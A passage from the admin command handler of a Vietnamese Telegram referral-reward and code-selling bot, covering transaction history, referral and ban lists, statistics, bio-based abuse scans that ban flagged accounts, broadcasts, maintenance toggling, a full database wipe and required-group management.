                    f"{icon} <b>Mã GD:</b> #{tx_id} | <b>Loại:</b> {tx_type}\n"
                    f"{E['MONEY']} <b>Số tiền:</b> <code>{amount:,}đ</code> | <b>Trạng thái:</b> {status}\n"
                    f"{E['SHIELD']} <b>Chi tiết:</b> <code>{details or 'Không có'}</code>\n"
                    f"{E['GLOBE']} <b>Thời gian:</b> <code>{created_at}</code>\n"
                    "----------------------------------\n"
                )
                if len(chunks[current_chunk_idx]) + len(line) > 3900:
                    chunks.append(line)
                    current_chunk_idx += 1
                else:
                    chunks[current_chunk_idx] += line
            for chunk_content in chunks:
                await message.reply_text(chunk_content, parse_mode="HTML")
                await asyncio.sleep(0.3)

        elif cmd in ("/checkfriends", "/friends"):
            if not args:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/friends ID_USER</code> hoặc <code>/checkfriends ID_USER</code>",
                    parse_mode="HTML",
                )
                return
            try:
                target_id = int(args[0])
            except ValueError:
                await message.reply_text(
                    f"{E['CROSS']} ID không hợp lệ!", parse_mode="HTML"
                )
                return
            invited = await db_query(
                "SELECT user_id, username, joined_at, phone_number, " + IP_SUB + " FROM users WHERE referrer_id=%s ORDER BY user_id DESC",
                (target_id,),
                fetchall=True,
            )
            if not invited:
                await message.reply_text(
                    f"{E['BANDAGE']} Người dùng <code>{target_id}</code> chưa mời được bạn bè nào.",
                    parse_mode="HTML",
                )
                return
            total_invited = len(invited)
            header = f"{E['TOP']} <b>DANH SÁCH BẠN BÈ MỜI BỞI ID:</b> <code>{target_id}</code>\n{E['STAR']} <b>Tổng số bạn bè mời:</b> <code>{total_invited:,}</code> người\n━━━━━━━━━━━━━━━━━━\n\n"
            chunks = [header]
            current_chunk_idx = 0
            all_buttons = []
            row = []
            for u_id, username, joined_at, phone, ip_addr in invited:
                uname_str = (
                    f"@{username}" if username else "Không có @username"
                )
                phone_str = phone if phone else "Chưa xác minh SĐT"
                ip_str = ip_addr if ip_addr else "Chưa xác minh IP"
                joined_str = joined_at if joined_at else "Không rõ"
                line = (
                    f"{E['CROWN']} <b>Full @name:</b> {uname_str}\n"
                    f"{E['PLUS']} <b>ID:</b> <code>{u_id}</code>\n"
                    f"{E['PHONE']} <b>SĐT:</b> <code>{phone_str}</code>\n"
                    f"{E['GLOBE']} <b>IP:</b> <code>{ip_str}</code>\n"
                    f"{E['GLOBE']} <b>Ngày tham gia:</b> <code>{joined_str}</code>\n"
                    "----------------------------------\n"
                )
                if len(chunks[current_chunk_idx]) + len(line) > 3800:
                    chunks.append(line)
                    current_chunk_idx += 1
                else:
                    chunks[current_chunk_idx] += line
                row.append(
                    abtn(f"{u_id}", "PIN2", url=f"tg://user?id={u_id}")
                )
                if len(row) == 2:
                    all_buttons.append(row)
                    row = []
            if row:
                all_buttons.append(row)
            for idx, chunk_content in enumerate(chunks):
                markup = (
                    InlineKeyboardMarkup(all_buttons)
                    if (idx == len(chunks) - 1 and all_buttons)
                    else None
                )
                await message.reply_text(
                    chunk_content,
                    reply_markup=markup,
                    parse_mode="HTML",
                    disable_web_page_preview=True,
                )
                await asyncio.sleep(0.3)

        elif cmd == "/users":
            res = await db_query("SELECT COUNT(*) FROM users", fetchone=True)
            total_users = res[0]
            users = await db_query(
                "SELECT user_id, username FROM users ORDER BY joined_at DESC LIMIT 50",
                fetchall=True,
            )
            msg = (
                f"{E['TOP']} <b>THỐNG KÊ TỔNG NGƯỜI DÙNG</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"{E['CROWN2']} Tổng số người dùng trong hệ thống: <b>{total_users:,}</b>\n\n"
                f"{E['RIGHT']} <b>Bấm vào nút ID bên dưới để kiểm tra full thông tin:</b>"
            )
            buttons = []
            row = []
            for u_id, u_name in users:
                btn_text = f"{u_id}"
                if u_name:
                    btn_text += f" (@{u_name})"
                row.append(
                    abtn(btn_text, "PIN2", callback_data=f"userinfo_{u_id}")
                )
                if len(row) == 2:
                    buttons.append(row)
                    row = []
            if row:
                buttons.append(row)
            await message.reply_text(
                msg,
                reply_markup=InlineKeyboardMarkup(buttons)
                if buttons
                else None,
                parse_mode="HTML",
            )

        elif cmd == "/stats":
            today = datetime.now(TIMEZONE).strftime("%Y-%m-%d") + "%"
            total = (
                await db_query("SELECT COUNT(*) FROM users", fetchone=True)
            )[0]
            banned = (
                await db_query(
                    "SELECT COUNT(*) FROM users WHERE is_banned=1",
                    fetchone=True,
                )
            )[0]
            wd_banned = (
                await db_query(
                    "SELECT COUNT(*) FROM users WHERE is_withdraw_banned=1 AND is_banned=0",
                    fetchone=True,
                )
            )[0]
            phone_ok = (
                await db_query(
                    "SELECT COUNT(*) FROM users WHERE phone_number IS NOT NULL AND phone_number<>''",
                    fetchone=True,
                )
            )[0]
            ip_ok = (
                await db_query(
                    "SELECT COUNT(DISTINCT user_id) FROM ip_logs",
                    fetchone=True,
                )
            )[0]
            cap_ok = (
                await db_query(
                    "SELECT COUNT(*) FROM users WHERE captcha_verified=1",
                    fetchone=True,
                )
            )[0]
            mcap_ok = (
                await db_query(
                    "SELECT COUNT(*) FROM users WHERE miniapp_captcha_verified=1",
                    fetchone=True,
                )
            )[0]
            cam_ok = (
                await db_query(
                    "SELECT COUNT(*) FROM users WHERE camera_verified=1",
                    fetchone=True,
                )
            )[0]
            cccam_ok = (
                await db_query(
                    "SELECT COUNT(*) FROM users WHERE cccam_verified=1",
                    fetchone=True,
                )
            )[0]
            sum_bal = (
                await db_query(
                    "SELECT COALESCE(SUM(balance),0) FROM users WHERE is_banned=0",
                    fetchone=True,
                )
            )[0]
            new_today = (
                await db_query(
                    "SELECT COUNT(*) FROM users WHERE joined_at LIKE %s",
                    (today,),
                    fetchone=True,
                )
            )[0]
            ref_today = (
                await db_query(
                    "SELECT COUNT(*) FROM transactions WHERE type='Thưởng Mời Bạn' AND status='Thành công' AND created_at LIKE %s",
                    (today,),
                    fetchone=True,
                )
            )[0]
            buy_today = await db_query(
                "SELECT COUNT(*), COALESCE(SUM(amount),0) FROM transactions WHERE type LIKE 'Mua Code%%' AND status='Thành công' AND created_at LIKE %s",
                (today,),
                fetchone=True,
            )
            buy_all = (
                await db_query(
                    "SELECT COUNT(*) FROM transactions WHERE type LIKE 'Mua Code%%' AND status='Thành công'",
                    fetchone=True,
                )
            )[0]
            stock = (
                await db_query(
                    "SELECT COUNT(*) FROM code_stock WHERE is_used=0",
                    fetchone=True,
                )
            )[0]
            maint = await is_maintenance()
            await message.reply_text(
                f"{E['TOP']} <b>BẢNG THỐNG KÊ HỆ THỐNG</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"{E['CROWN2']} Tổng thành viên: <b>{total:,}</b>\n"
                f"{E['GRIN']} Thành viên mới hôm nay: <b>{new_today:,}</b>\n"
                f"{E['CROSS']} Đang bị khóa: <b>{banned:,}</b>\n"
                f"{E['WARN']} Bị cấm rút code (chưa khóa): <b>{wd_banned:,}</b>\n"
                f"{E['PHONE']} Đã xác minh SĐT: <b>{phone_ok:,}</b>\n"
                f"{E['IMAGE']} Đã xác minh CCCAM: <b>{cccam_ok:,}</b>\n"
                f"{E['IMAGE']} Đã xác minh Camera: <b>{cam_ok:,}</b>\n"
                f"{E['SHIELD']} Đã qua Captcha MiniApp: <b>{mcap_ok:,}</b>\n"
                f"{E['GLOBE']} Đã xác minh IP: <b>{ip_ok:,}</b>\n"
                f"{E['SHIELD']} Đã qua Captcha: <b>{cap_ok:,}</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"{E['MONEY']} Tổng số dư (user không bị khóa): <b>{sum_bal:,}đ</b>\n"
                f"{E['ROCKET']} Lượt mời thành công hôm nay: <b>{ref_today:,}</b>\n"
                f"{E['CARD']} Code đã bán hôm nay: <b>{buy_today[0]:,}</b> ({buy_today[1]:,}đ)\n"
                f"{E['CARD']} Tổng code đã bán: <b>{buy_all:,}</b>\n"
                f"{E['FIRE']} Kho code còn: <b>{stock:,}</b>\n"
                f"{E['MONEY']} Giá code hiện tại: <b>{CODE_PRICE:,}đ</b>\n"
                f"{E['GEAR']} Bảo trì: <b>{'ĐANG BẬT 🔴' if maint else 'Tắt 🟢'}</b>",
                parse_mode="HTML",
            )

        elif cmd == "/banlist":
            total_b = (
                await db_query(
                    "SELECT COUNT(*) FROM users WHERE is_banned=1",
                    fetchone=True,
                )
            )[0]
            rows = await db_query(
                "SELECT user_id, username, " + IP_SUB + " FROM users WHERE is_banned=1 ORDER BY user_id DESC LIMIT 40",
                fetchall=True,
            )
            if not rows:
                await message.reply_text(
                    f"{E['CHECK2']} Hiện không có tài khoản nào bị khóa.",
                    parse_mode="HTML",
                )
                return
            msg = f"{E['CROSS']} <b>DANH SÁCH TÀI KHOẢN BỊ KHÓA</b> (tổng <b>{total_b:,}</b>, hiện 40 mới nhất)\n━━━━━━━━━━━━━━━━━━\n"
            for u_id, u_name, ip in rows:
                msg += f"• {('@' + u_name) if u_name else 'N/A'} | <code>{u_id}</code> | IP: <code>{ip or 'N/A'}</code>\n"
            msg += f"\n{E['INFO']} Mở khóa: <code>/unban ID</code> hoặc <code>/unall ID</code>"
            await send_split_message(
                context.bot, chat_id, msg, parse_mode="HTML"
            )

        elif cmd == "/wdbanlist":
            total_c = (
                await db_query(
                    "SELECT COUNT(*) FROM users WHERE is_withdraw_banned=1 AND is_banned=0",
                    fetchone=True,
                )
            )[0]
            rows = await db_query(
                "SELECT user_id, username, balance FROM users WHERE is_withdraw_banned=1 AND is_banned=0 ORDER BY user_id DESC LIMIT 40",
                fetchall=True,
            )
            if not rows:
                await message.reply_text(
                    f"{E['CHECK2']} Không có tài khoản nào bị cấm rút code.",
                    parse_mode="HTML",
                )
                return
            msg = f"{E['WARN']} <b>DANH SÁCH BỊ CẤM RÚT CODE</b> (tổng <b>{total_c:,}</b>)\n━━━━━━━━━━━━━━━━━━\n"
            for u_id, u_name, bal in rows:
                msg += f"• {('@' + u_name) if u_name else 'N/A'} | <code>{u_id}</code> | <code>{bal:,}đ</code>\n"
            msg += f"\n{E['INFO']} Gỡ cấm: <code>/unbanwd ID</code>"
            await send_split_message(
                context.bot, chat_id, msg, parse_mode="HTML"
            )

        elif cmd == "/topbal":
            rows = await db_query(
                "SELECT user_id, username, balance FROM users WHERE is_banned=0 AND balance>0 ORDER BY balance DESC LIMIT 15",
                fetchall=True,
            )
            if not rows:
                await message.reply_text(
                    f"{E['BANDAGE']} Chưa có user nào có số dư.",
                    parse_mode="HTML",
                )
                return
            medals = {
                1: E["GOLD_MEDAL"],
                2: E["SILVER_MEDAL"],
                3: E["BRONZE_MEDAL"],
            }
            msg = f"{E['MONEY']} <b>TOP 15 SỐ DƯ CAO NHẤT</b>\n━━━━━━━━━━━━━━━━━━\n"
            for i, (u_id, u_name, bal) in enumerate(rows, start=1):
                msg += f"{medals.get(i, E['RIGHT'])} <b>{i}.</b> {('@' + u_name) if u_name else 'N/A'} | <code>{u_id}</code> | <code>{bal:,}đ</code>\n"
            await message.reply_text(msg, parse_mode="HTML")

        elif cmd in ("/dupip", "/dupphone"):
            label = "IP" if cmd == "/dupip" else "SĐT"
            if cmd == "/dupip":
                rows = await db_query(
                    "SELECT ip_address, COUNT(*), array_agg(user_id ORDER BY user_id) FROM ip_logs "
                    "GROUP BY ip_address HAVING COUNT(*)>1 ORDER BY COUNT(*) DESC LIMIT 20",
                    fetchall=True,
                )
            else:
                rows = await db_query(
                    "SELECT phone_number, COUNT(*), array_agg(user_id) FROM users "
                    "WHERE phone_number IS NOT NULL AND phone_number<>'' "
                    "GROUP BY phone_number HAVING COUNT(*)>1 ORDER BY COUNT(*) DESC LIMIT 20",
                    fetchall=True,
                )
            if not rows:
                await message.reply_text(
                    f"{E['CHECK2']} Không có {label} nào bị dùng chung bởi nhiều tài khoản.",
                    parse_mode="HTML",
                )
                return
            msg = f"{E['GLOBE']} <b>{label} DÙNG CHUNG NHIỀU TÀI KHOẢN</b>\n━━━━━━━━━━━━━━━━━━\n\n"
            for val, cnt, ids in rows:
                ids_txt = ", ".join(f"<code>{i}</code>" for i in ids[:10])
                msg += f"{E['WARN']} <code>{val}</code> — <b>{cnt}</b> tài khoản\n   ID: {ids_txt}\n\n"
            await send_split_message(
                context.bot, chat_id, msg, parse_mode="HTML"
            )

        elif cmd == "/biofriends":
            if not args:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/biofriends USER_ID</code>",
                    parse_mode="HTML",
                )
                return
            try:
                target_id = int(args[0])
            except ValueError:
                await message.reply_text(
                    f"{E['CROSS']} USER_ID không hợp lệ.", parse_mode="HTML"
                )
                return
            owner = await db_query(
                "SELECT user_id, username, phone_number, " + IP_SUB + " FROM users WHERE user_id=%s",
                (target_id,),
                fetchone=True,
            )
            if not owner:
                await message.reply_text(
                    f"{E['CROSS']} Không tìm thấy ID <code>{target_id}</code> trong cơ sở dữ liệu.",
                    parse_mode="HTML",
                )
                return
            invited = await db_query(
                "SELECT user_id, username, phone_number, " + IP_SUB + ", is_banned FROM users WHERE referrer_id=%s ORDER BY joined_at DESC",
                (target_id,),
                fetchall=True,
            )
            if not invited:
                await message.reply_text(
                    f"{E['BANDAGE']} ID <code>{target_id}</code> chưa mời được bạn bè nào.",
                    parse_mode="HTML",
                )
                return
            await message.reply_text(
                f"{E['HOURGLASS']} Đang kiểm tra tiểu sử <b>{len(invited):,}</b> bạn bè được mời bởi <code>{target_id}</code>...",
                parse_mode="HTML",
            )
            matched, unreadable = [], 0
            for u_id, u_uname, u_phone, u_ip, u_banned in invited:
                res = await check_bio_flag(context.bot, u_id)
                if res is None:
                    unreadable += 1
                elif res:
                    matched.append((u_id, u_uname, u_phone, u_ip, u_banned))
                await asyncio.sleep(0.05)

            owner_name = (
                f"@{owner[1]}" if owner[1] else "Chưa đặt username"
            )
            lines = [
                f"{E['TOP']} <b>KẾT QUẢ /biofriends — ID:</b> <code>{target_id}</code>\n━━━━━━━━━━━━━━━━━━",
                f"{E['CROWN']} Người mời: {owner_name} | SĐT: <code>{owner[2] or 'N/A'}</code> | IP: <code>{owner[3] or 'N/A'}</code>",
                f"{E['RIGHT']} Tổng bạn bè đã mời: <b>{len(invited):,}</b>",
                f"{E['CROSS']} Có tiểu sử @Lienminhvietnam: <b>{len(matched):,}</b>",
                f"{E['WARN']} Không đọc được tiểu sử: <b>{unreadable:,}</b> (user đã chặn bot / lỗi)",
                "━━━━━━━━━━━━━━━━━━",
            ]
            if matched:
                lines.append(
                    "👥 <b>Danh sách bạn bè có tiểu sử @Lienminhvietnam:</b>\n"
                )
                for u_id, u_uname, u_phone, u_ip, u_banned in matched:
                    nm = f"@{u_uname}" if u_uname else f"User {u_id}"
                    lines.append(
                        f"• {nm} | ID: <code>{u_id}</code>\n"
                        f"  SĐT: <code>{u_phone or 'N/A'}</code> | IP: <code>{u_ip or 'N/A'}</code> | Khóa: <b>{'CÓ' if u_banned else 'KHÔNG'}</b>"
                    )
            else:
                lines.append(
                    f"{E['CHECK2']} Không có bạn bè nào để tiểu sử @Lienminhvietnam."
                )
            await send_split_message(
                context.bot, chat_id, "\n".join(lines), parse_mode="HTML"
            )

        elif cmd == "/scanbio":
            await message.reply_text(
                f"{E['HOURGLASS']} Đang tiến hành kiểm tra tiểu sử thành viên hệ thống...",
                parse_mode="HTML",
            )
            all_users = await db_query(
                "SELECT user_id, username, phone_number, " + IP_SUB + ", referrer_id FROM users WHERE is_banned=0",
                fetchall=True,
            )

            banned_pairs = []
            referrer_map = defaultdict(list)

            for u_id, uname, phone, ip, ref_id in all_users:
                try:
                    chat_full = await context.bot.get_chat(u_id)
                    bio = chat_full.bio or ""
                    if BIO_FLAG in bio.lower():
                        if ref_id:
                            banned_pairs.append((ref_id, u_id))
                            referrer_map[ref_id].append(u_id)
                except Exception as e:
                    logger.warning(
                        f"Không thể check bio user {u_id}: {e}"
                    )
                await asyncio.sleep(0.05)

            if not banned_pairs:
                await message.reply_text(
                    f"{E['CHECK']} Không phát hiện tài khoản nào có tiểu sử `@Lienminhvietnam` và có người giới thiệu.",
                    parse_mode="HTML",
                )
                return

            report_lines = [
                "🚨 <b>BÁO CÁO KHÓA TÀI KHOẢN BUFF / VI PHẠM</b>\n━━━━━━━━━━━━━━━━━━\n"
            ]

            for ref_id, ref_by_id in banned_pairs:
                await db_query(
                    "UPDATE users SET is_banned=1, is_withdraw_banned=1 WHERE user_id=%s",
                    (ref_by_id,),
                    commit=True,
                )
                await db_query(
                    "UPDATE users SET is_banned=1, is_withdraw_banned=1 WHERE user_id=%s",
                    (ref_id,),
                    commit=True,
                )

            for ref_id, referred_list in referrer_map.items():
                ref_info = await db_query(
                    "SELECT user_id, username, phone_number, " + IP_SUB + " FROM users WHERE user_id=%s",
                    (ref_id,),
                    fetchone=True,
                )
                ref_uname = (
                    f"@{ref_info[1]}"
                    if ref_info and ref_info[1]
                    else f"User {ref_id}"
                )
                ref_phone = (
                    ref_info[2] if ref_info and ref_info[2] else "Chưa có SĐT"
                )
                ref_ip = (
                    ref_info[3]
                    if ref_info and len(ref_info) > 3 and ref_info[3]
                    else "Chưa có IP"
                )

                report_lines.append(
                    f"{E['CROWN']} <b>Người Giới Thiệu:</b>\n• @name: {ref_uname} | ID: <code>{ref_id}</code>\n• SĐT: <code>{ref_phone}</code> | IP: <code>{ref_ip}</code>\n"
                )
                report_lines.append(
                    "👥 <b>Người Được Giới Thiệu (Có tiểu sử @Lienminhvietnam):</b>"
                )

                for r_id in referred_list:
                    r_info = await db_query(
                        "SELECT user_id, username, phone_number, " + IP_SUB + " FROM users WHERE user_id=%s",
                        (r_id,),
                        fetchone=True,
                    )
                    r_uname = (
                        f"@{r_info[1]}"
                        if r_info and r_info[1]
                        else f"User {r_id}"
                    )
                    r_phone = (
                        r_info[2] if r_info and r_info[2] else "Chưa có SĐT"
                    )
                    r_ip = (
                        r_info[3]
                        if r_info and len(r_info) > 3 and r_info[3]
                        else "Chưa có IP"
                    )
                    report_lines.append(
                        f"• @name: {r_uname} | ID: <code>{r_id}</code> | SĐT: <code>{r_phone}</code> | IP: <code>{r_ip}</code>"
                    )
                report_lines.append("----------------------------------\n")

            full_report = "\n".join(report_lines)
            await send_split_message(
                context.bot, chat_id, full_report, parse_mode="HTML"
            )

        elif cmd == "/banbuff":
            await message.reply_text(
                f"{E['HOURGLASS']} Đang quét hệ thống để khóa toàn bộ tài khoản buff tiểu sử `@Lienminhvietnam`...",
                parse_mode="HTML",
            )
            all_users = await db_query(
                "SELECT user_id, username, referrer_id FROM users WHERE is_banned=0",
                fetchall=True,
            )

            banned_pairs = []
            referrer_map = defaultdict(list)

            for u_id, uname, ref_id in all_users:
                try:
                    chat_full = await context.bot.get_chat(u_id)
                    bio = chat_full.bio or ""
                    if BIO_FLAG in bio.lower():
                        if ref_id:
                            banned_pairs.append((ref_id, u_id))
                            referrer_map[ref_id].append(u_id)
                except Exception as e:
                    logger.warning(f"Lỗi check bio user {u_id}: {e}")
                await asyncio.sleep(0.05)

            if not banned_pairs:
                await message.reply_text(
                    f"{E['CHECK']} Không tìm thấy tài khoản nào để khóa.",
                    parse_mode="HTML",
                )
                return

            report_lines = [
                "🚨 <b>THÔNG BÁO KHÓA TOÀN BỘ TÀI KHOẢN BUFF</b>\n━━━━━━━━━━━━━━━━━━\n"
            ]
            for ref_id, ref_by_id in banned_pairs:
                await db_query(
                    "UPDATE users SET is_banned=1, is_withdraw_banned=1 WHERE user_id=%s",
                    (ref_by_id,),
                    commit=True,
                )
                await db_query(
                    "UPDATE users SET is_banned=1, is_withdraw_banned=1 WHERE user_id=%s",
                    (ref_id,),
                    commit=True,
                )

            for ref_id, referred_list in referrer_map.items():
                ref_info = await db_query(
                    "SELECT user_id, username, phone_number, " + IP_SUB + " FROM users WHERE user_id=%s",
                    (ref_id,),
                    fetchone=True,
                )
                ref_uname = (
                    f"@{ref_info[1]}"
                    if ref_info and ref_info[1]
                    else f"User {ref_id}"
                )

                report_lines.append(
                    f"{E['CROWN']} <b>Người Giới Thiệu:</b>\n• @name: {ref_uname} | ID: <code>{ref_id}</code>\n"
                )
                report_lines.append(
                    "👥 <b>Người Được Giới Thiệu:</b>"
                )
                for r_id in referred_list:
                    r_info = await db_query(
                        "SELECT user_id, username FROM users WHERE user_id=%s",
                        (r_id,),
                        fetchone=True,
                    )
                    r_uname = (
                        f"@{r_info[1]}"
                        if r_info and r_info[1]
                        else f"User {r_id}"
                    )
                    report_lines.append(
                        f"• @name: {r_uname} | ID: <code>{r_id}</code>"
                    )
                report_lines.append("----------------------------------\n")

            full_report = "\n".join(report_lines)
            await send_split_message(
                context.bot, chat_id, full_report, parse_mode="HTML"
            )

        elif cmd == "/checkref":
            if not args:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/checkref USER_ID_HOẶC_USERNAME</code>",
                    parse_mode="HTML",
                )
                return

            target_query = args[0].replace("@", "")
            if target_query.isdigit():
                ref_user_row = await db_query(
                    "SELECT user_id, username, phone_number, " + IP_SUB + " FROM users WHERE user_id=%s",
                    (int(target_query),),
                    fetchone=True,
                )
            else:
                ref_user_row = await db_query(
                    "SELECT user_id, username, phone_number, " + IP_SUB + " FROM users WHERE username ILIKE %s",
                    (target_query,),
                    fetchone=True,
                )

            if not ref_user_row:
                await message.reply_text(
                    f"{E['CROSS']} Không tìm thấy người giới thiệu trong cơ sở dữ liệu.",
                    parse_mode="HTML",
                )
                return

            ref_id, ref_uname_db, ref_phone, ref_ip = ref_user_row
            ref_name_display = (
                f"@{ref_uname_db}" if ref_uname_db else f"User {ref_id}"
            )

            invited_users = await db_query(
                "SELECT user_id, username, phone_number, " + IP_SUB + " FROM users WHERE referrer_id=%s",
                (ref_id,),
                fetchall=True,
            )
            if not invited_users:
                await message.reply_text(
                    f"{E['BANDAGE']} Người giới thiệu này chưa mời được thành viên nào.",
                    parse_mode="HTML",
                )
                return

            matched_referred = []
            for u_id, u_uname, u_phone, u_ip in invited_users:
                try:
                    chat_full = await context.bot.get_chat(u_id)
                    bio = chat_full.bio or ""
                    if BIO_FLAG in bio.lower():
                        matched_referred.append((u_id, u_uname, u_phone, u_ip))
                except Exception as e:
                    logger.warning(f"Lỗi check bio user {u_id}: {e}")
                await asyncio.sleep(0.05)

            if not matched_referred:
                await message.reply_text(
                    f"{E['CHECK']} Người giới thiệu này không có người được giới thiệu nào để tiểu sử `@Lienminhvietnam`.",
                    parse_mode="HTML",
                )
                return

            report_lines = [
                "📊 <b>THỐNG KÊ CHECK THÀNH VIÊN GIỚI THIỆU</b>\n━━━━━━━━━━━━━━━━━━\n",
                f"{E['CROWN']} <b>Người Giới Thiệu</b>\n• @name: {ref_name_display}\n• Full thông tin: ID `<code>{ref_id}</code>` | SĐT: `<code>{ref_phone or 'N/A'}</code>` | IP: `<code>{ref_ip or 'N/A'}</code>`\n",
                "👥 <b>Người Được Giới Thiệu (Có tiểu sử @Lienminhvietnam):</b>",
            ]

            for r_id, r_uname, r_phone, r_ip in matched_referred:
                r_name_display = f"@{r_uname}" if r_uname else f"User {r_id}"
                report_lines.append(
                    f"• @name: {r_name_display}\n  Full thông tin: ID `<code>{r_id}</code>` | SĐT: `<code>{r_phone or 'N/A'}</code>` | IP: `<code>{r_ip or 'N/A'}</code>`"
                )

            full_report = "\n".join(report_lines)
            await send_split_message(
                context.bot, chat_id, full_report, parse_mode="HTML"
            )

        elif cmd == "/broadcast":
            if not args:
                await message.reply_text(
                    "Cú pháp: <code>/broadcast Nội dung thông báo</code>",
                    parse_mode="HTML",
                )
                return
            content = " ".join(args).strip()
            users = await db_query(
                "SELECT user_id FROM users WHERE is_banned=0", fetchall=True
            )
            groups = await db_query(
                "SELECT chat_id FROM groups", fetchall=True
            )
            count = 0
            for (target_id,) in users:
                try:
                    await context.bot.send_message(
                        chat_id=target_id,
                        text=f"{E['SPEAKER']} <b>THÔNG BÁO HỆ THỐNG</b>\n━━━━━━━━━━━━━━━━━━\n\n{content}",
                        parse_mode="HTML",
                    )
                    count += 1
                except Exception:
                    pass
                await asyncio.sleep(0.05)
            for (g_chat_id,) in groups:
                try:
                    await context.bot.send_message(
                        chat_id=g_chat_id,
                        text=f"{E['SPEAKER']} <b>THÔNG BÁO HỆ THỐNG</b>\n━━━━━━━━━━━━━━━━━━\n\n{content}",
                        parse_mode="HTML",
                    )
                    count += 1
                except Exception:
                    pass
                await asyncio.sleep(0.05)
            await message.reply_text(
                f"{E['CHECK2']} Đã phát thông báo tới <b>{count}</b> người dùng/nhóm.",
                parse_mode="HTML",
            )

        elif cmd == "/sendmsg":
            if len(args) < 2:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/sendmsg USER_ID Nội dung tin nhắn</code>",
                    parse_mode="HTML",
                )
                return
            try:
                target_id = int(args[0])
            except ValueError:
                await message.reply_text(
                    f"{E['CROSS']} USER_ID không hợp lệ.", parse_mode="HTML"
                )
                return
            content = " ".join(args[1:]).strip()
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=f"{E['SPEAKER']} <b>TIN NHẮN TỪ ADMIN</b>\n━━━━━━━━━━━━━━━━━━\n\n{content}",
                    parse_mode="HTML",
                )
                await message.reply_text(
                    f"{E['CHECK2']} Đã gửi tin nhắn tới <code>{target_id}</code>.",
                    parse_mode="HTML",
                )
            except Exception as exc:
                await message.reply_text(
                    f"{E['CROSS']} Gửi thất bại: <code>{exc}</code>",
                    parse_mode="HTML",
                )

        elif cmd == "/maint":
            curr = await is_maintenance()
            new_val = "0" if curr else "1"
            await db_query(
                "UPDATE settings SET value=%s WHERE key='maintenance'",
                (new_val,),
                commit=True,
            )
            status_str = (
                "BẮT ĐẦU BẢO TRÌ 🔴"
                if new_val == "1"
                else "TẮT BẢO TRÌ 🟢"
            )
            await message.reply_text(
                f"{E['GEAR']} Trạng thái hệ thống: <b>{status_str}</b>",
                parse_mode="HTML",
            )

        elif cmd == "/wipeall":
            await db_query(
                "TRUNCATE TABLE users, transactions, code_stock, code_deleted_log RESTART IDENTITY",
                commit=True,
            )
            user_msg_tracker.clear()
            temp_bans.clear()
            user_withdraw_state.clear()
            pending_captcha_users.clear()
            pending_miniapp_captcha.clear()
            pending_camera_verified.clear()
            await db_query(
                "INSERT INTO users (user_id, username, balance, joined_at) VALUES (%s, %s, 0, %s) ON CONFLICT (user_id) DO NOTHING",
                (
                    user_id,
                    update.effective_user.username or "",
                    get_now_str(),
                ),
                commit=True,
            )
            await message.reply_text(
                f"{E['CHECK2']} <b>ĐÃ RESET TOÀN BỘ HỆ THỐNG!</b>\n"
                f"• Toàn bộ người dùng, kho code & lịch sử giao dịch đã được xóa hoàn toàn.",
                parse_mode="HTML",
            )

        elif cmd == "/addgroup":
            if not args:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/addgroup @username</code>\n"
                    f"Nhóm riêng tư: <code>/addgroup -100123456 https://t.me/+linkmoi</code>",
                    parse_mode="HTML",
                )
                return
            ref = _norm_chat_ref(args[0])
            if not ref:
                await message.reply_text(
                    f"{E['CROSS']} Không nhận diện được nhóm. Hãy dùng <b>@username</b>, link công khai hoặc ID <code>-100...</code> "
                    f"(link mời dạng <code>t.me/+xxx</code> không tự kiểm tra được).",
                    parse_mode="HTML",
                )
                return
            invite_url = next(
                (a for a in args[1:] if a.startswith("http")), None
            )

            is_ad, status, chat = await check_bot_admin(context.bot, ref)
            if chat is None:
                await message.reply_text(
                    f"{E['CROSS']} <b>Không truy cập được nhóm này!</b>\n"
                    f"Hãy thêm bot vào nhóm và cấp quyền <b>admin</b> rồi thử lại.\n"
                    f"<code>{_html.escape(status)}</code>",
                    parse_mode="HTML",
                )
                return
            if not is_ad:
                await message.reply_text(
                    f"{E['CROSS']} <b>BOT CHƯA LÀ ADMIN CỦA NHÓM NÀY!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"Trạng thái hiện tại của bot: <code>{status}</code>\n"
                    f"{E['RIGHT']} Hãy thêm bot làm <b>admin</b> rồi thêm lại nhóm.",
                    parse_mode="HTML",
                )
                return

            store_ref = f"@{chat.username}" if chat.username else str(chat.id)
            if not invite_url:
                if chat.username:
                    invite_url = f"https://t.me/{chat.username}"
                else:
                    await message.reply_text(
                        f"{E['WARN']} Nhóm riêng tư cần kèm link mời:\n"
                        f"<code>/addgroup {chat.id} https://t.me/+linkmoi</code>",
                        parse_mode="HTML",
                    )
                    return
            title = chat.title or store_ref

            def add_channel(cursor):
                cursor.execute(
                    "INSERT INTO required_channels (chat_ref, title, invite_url, added_at) "
                    "VALUES (%s,%s,%s,%s) ON CONFLICT (chat_ref) DO NOTHING",
                    (store_ref, title, invite_url, get_now_str()),
                )
                return cursor.rowcount == 1

            ok = await db_transaction(add_channel)
            if not ok:
                await message.reply_text(
                    f"{E['WARN']} Nhóm <b>{_html.escape(title)}</b> đã có trong danh sách rồi.",
                    parse_mode="HTML",
                )
                return
            await message.reply_text(
                f"{E['CHECK2']} <b>ĐÃ THÊM NHÓM YÊU CẦU THAM GIA!</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"{E['RIGHT']} Tên: <b>{_html.escape(title)}</b>\n"
                f"{E['TARGET']} Định danh: <code>{store_ref}</code>\n"
                f"{E['SHIELD']} Bot là admin: <b>CÓ</b>",
                parse_mode="HTML",
            )

        elif cmd == "/delgroup":
            if not args:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/delgroup ID_SỐ_hoặc_@username</code>",
                    parse_mode="HTML",
                )
                return
            key = args[0]

            def del_channel(cursor):
                if key.isdigit() and len(key) < 6:
                    cursor.execute(
                        "DELETE FROM required_channels WHERE id=%s RETURNING chat_ref, title",
                        (int(key),),
                    )
                else:
                    ref = _norm_chat_ref(key)
